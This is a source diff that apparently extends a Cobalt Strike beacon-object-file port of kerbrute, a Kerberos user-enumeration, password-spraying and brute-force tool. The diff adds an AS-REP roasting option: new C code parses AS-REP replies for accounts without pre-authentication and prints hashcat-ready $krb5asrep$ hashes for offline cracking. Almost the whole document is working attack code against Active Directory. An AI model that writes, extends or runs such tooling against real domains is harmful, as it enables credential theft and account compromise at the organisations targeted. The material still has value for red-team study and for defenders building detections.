@@ -107,11 +107,12 @@ static void fmt4(char *p, int v) {
 #define FLAG_DOWNGRADE  0x1
 #define FLAG_SAFE       0x2
 #define FLAG_VERBOSE    0x4
+#define FLAG_ROAST      0x8
 
 /* ── Shared context ──────────────────────────────────────────────────────── */
 typedef struct {
     const char *dc, *domain, *password, *username;
-    int   delay, jitter, downgrade, safe, verbose;
+    int   delay, jitter, downgrade, safe, verbose, roast;
     int   valid, notfound, locked, errors;
     int   aborted, done;
 } krb_ctx;
@@ -751,6 +752,149 @@ static char *trim(char *s) {
     s[n]=0; return s;
 }
 
+/* ── Hex helpers ─────────────────────────────────────────────────────────── */
+
+static void bytes_to_hex(const BYTE *in, int len, char *out) {
+    static const char hx[] = "0123456789abcdef";
+    for (int i = 0; i < len; i++) {
+        out[i*2]   = hx[in[i] >> 4];
+        out[i*2+1] = hx[in[i] & 0xf];
+    }
+    out[len * 2] = 0;
+}
+
+static void str_cat(char *buf, int *pos, int max, const char *s) {
+    while (*s && *pos < max - 1) buf[(*pos)++] = *s++;
+    if (*pos < max) buf[*pos] = 0;
+}
+
+/*
+ * Parse the enc-part of an AS-REP and format as a hashcat-ready hash.
+ *
+ * Etype 23 (RC4):
+ *   $krb5asrep$23$user@REALM:checksum$data      (hashcat mode 18200)
+ *   — checksum = first 16 cipher bytes (hex)
+ *   — data     = remaining cipher bytes (hex)
+ *
+ * Etype 18 (AES-256) / 17 (AES-128):
+ *   $krb5asrep$18$user@REALM:cipher_hex          (hashcat mode 19700)
+ *   $krb5asrep$17$user@REALM:cipher_hex          (hashcat mode 19600)
+ *
+ * Returns bytes written to out (not counting NUL), or -1 on parse error.
+ */
+static int extract_asrep_hash(const BYTE *r, int rlen,
+                               const char *username, const char *domain,
+                               char *out, int outmax) {
+    if (rlen < 4 || r[0] != APP_AS_REP) return -1;
+
+    /* Skip [APPLICATION 11] (0x6b) + length */
+    int pos = 1;
+    if (r[pos] & 0x80) pos += (r[pos] & 0x7f) + 1; else pos++;
+
+    /* Skip outer SEQUENCE + length */
+    if (pos >= rlen || r[pos] != 0x30) return -1; pos++;
+    if (r[pos] & 0x80) pos += (r[pos] & 0x7f) + 1; else pos++;
+
+    /* Walk context fields looking for [6] enc-part (tag 0xa6) */
+    while (pos + 2 < rlen) {
+        BYTE tag = r[pos++];
+        int  flen;
+        if (r[pos] & 0x80) {
+            int lb = r[pos] & 0x7f; flen = 0; pos++;
+            for (int i = 0; i < lb && pos < rlen; i++) flen = (flen << 8) | r[pos++];
+        } else { flen = r[pos++]; }
+
+        if (tag == 0xa6) {
+            /* Found enc-part — skip its inner SEQUENCE header */
+            int ep = pos;
+            if (ep >= rlen || r[ep] != 0x30) return -1; ep++;
+            if (r[ep] & 0x80) ep += (r[ep] & 0x7f) + 1; else ep++;
+
+            int ep_end      = pos + flen;
+            int etype       = -1;
+            const BYTE *cipher = NULL;
+            int cipher_len  = 0;
+
+            /* Walk EncryptedData fields for [0] etype and [2] cipher */
+            while (ep + 2 < ep_end && ep < rlen) {
+                BYTE etag = r[ep++];
+                int  elen;
+                if (r[ep] & 0x80) {
+                    int lb = r[ep] & 0x7f; elen = 0; ep++;
+                    for (int i = 0; i < lb && ep < rlen; i++) elen = (elen << 8) | r[ep++];
+                } else { elen = r[ep++]; }
+
+                if (etag == 0xa0 && elen >= 3 && ep + 2 < rlen && r[ep] == 0x02) {
+                    /* [0] etype INTEGER */
+                    int il = r[ep + 1];
+                    if      (il == 1 && ep + 2 < rlen) etype = r[ep + 2];
+                    else if (il == 2 && ep + 3 < rlen) etype = (r[ep+2] << 8) | r[ep+3];
+                } else if (etag == 0xa2) {
+                    /* [2] cipher — OCTET STRING inside */
+                    int ip = ep;
+                    if (ip < rlen && r[ip] == 0x04) {
+                        ip++;
+                        int cl;
+                        if (r[ip] & 0x80) {
+                            int lb = r[ip] & 0x7f; cl = 0; ip++;
+                            for (int i = 0; i < lb && ip < rlen; i++) cl = (cl << 8) | r[ip++];
+                        } else { cl = r[ip++]; }
+                        cipher     = r + ip;
+                        cipher_len = cl;
+                    }
+                }
+                ep += elen;
+            }
+
+            if (etype < 0 || !cipher || cipher_len == 0) return -1;
+
+            /* Uppercase realm for the hash */
+            char realm[128]; Memset(realm, 0, 128);
+            int dl = Strlen(domain);
+            for (int i = 0; i < dl && i < 127; i++) {
+                char c2 = domain[i];
+                realm[i] = (c2 >= 'a' && c2 <= 'z') ? c2 - 0x20 : c2;
+            }
+
+            /* Build hash string */
+            int o = 0;
+            str_cat(out, &o, outmax, "$krb5asrep$");
+            if      (etype == 23) str_cat(out, &o, outmax, "23");
+            else if (etype == 18) str_cat(out, &o, outmax, "18");
+            else if (etype == 17) str_cat(out, &o, outmax, "17");
+            else                  str_cat(out, &o, outmax, "??");
+            str_cat(out, &o, outmax, "$");
+            str_cat(out, &o, outmax, username);
+            str_cat(out, &o, outmax, "@");
+            str_cat(out, &o, outmax, realm);
+            str_cat(out, &o, outmax, ":");
+
+            if (etype == 23 && cipher_len > 16) {
+                /* RC4: checksum (first 16 bytes) separated from data by $ */
+                char *ck = (char*)Malloc(33);
+                bytes_to_hex(cipher, 16, ck);
+                str_cat(out, &o, outmax, ck);
+                Free(ck);
+                str_cat(out, &o, outmax, "$");
+                char *rest = (char*)Malloc((cipher_len - 16) * 2 + 1);
+                bytes_to_hex(cipher + 16, cipher_len - 16, rest);
+                str_cat(out, &o, outmax, rest);
+                Free(rest);
+            } else {
+                /* AES (or short RC4): full cipher hex */
+                char *hex = (char*)Malloc(cipher_len * 2 + 1);
+                bytes_to_hex(cipher, cipher_len, hex);
+                str_cat(out, &o, outmax, hex);
+                Free(hex);
+            }
+
+            return o;
+        }
+        pos += flen;
+    }
+    return -1;   /* enc-part not found */
+}
+
 /*
  * ── Core test ──────────────────────────────────────────────────────────────
  *
@@ -801,7 +945,16 @@ static int test_user(krb_ctx *ctx, const char *username, const char *password) {
         rlen = krb_transact(ctx->dc, req, req_len, resp, MAX_RESP);
         if (rlen <= 0) return -1;
         /* AS-REP without pre-auth = account is AS-REP roastable (return 4) */
-        if (resp[0] == APP_AS_REP) return 4;
+        if (resp[0] == APP_AS_REP) {
+            if (ctx->roast) {
+                char *hash_buf = (char*)Malloc(4096);
+                if (extract_asrep_hash(resp, rlen, username, ctx->domain,
+                                        hash_buf, 4096) > 0)
+                    BeaconPrintf(CALLBACK_OUTPUT, "[HASH] %s\n", hash_buf);
+                Free(hash_buf);
+            }
+            return 4;
+        }
         return handle_krb_err(parse_krb_error(resp, rlen), username, ctx->domain, 0);
     }
 
@@ -992,15 +1145,17 @@ void go(char *buffer, int length) {
     ctx.downgrade = (flags&FLAG_DOWNGRADE)!=0;
     ctx.safe      = (flags&FLAG_SAFE)!=0;
     ctx.verbose   = (flags&FLAG_VERBOSE)!=0;
+    ctx.roast     = (flags&FLAG_ROAST)!=0;
 
     static const char *mnames[]={"userenum","passwordspray","bruteuser","bruteforce"};
     BeaconPrintf(CALLBACK_OUTPUT,
-        "[kerbrute] mode=%s  domain=%s  dc=%s  delay=%dms  jitter=%dms  aes=%s  downgrade=%s  safe=%s  verbose=%s\n",
+        "[kerbrute] mode=%s  domain=%s  dc=%s  delay=%dms  jitter=%dms  aes=%s  downgrade=%s  safe=%s  verbose=%s  roast=%s\n",
         (mode>=0&&mode<=3)?mnames[mode]:"?", domain, ctx.dc, delay, ctx.jitter,
         ctx.downgrade?"no":"yes",
         ctx.downgrade?"yes":"no",
         ctx.safe?"yes":"no",
-        ctx.verbose?"yes":"no");
+        ctx.verbose?"yes":"no",
+        ctx.roast?"yes":"no");
 
     switch (mode) {
     case MODE_USERENUM:
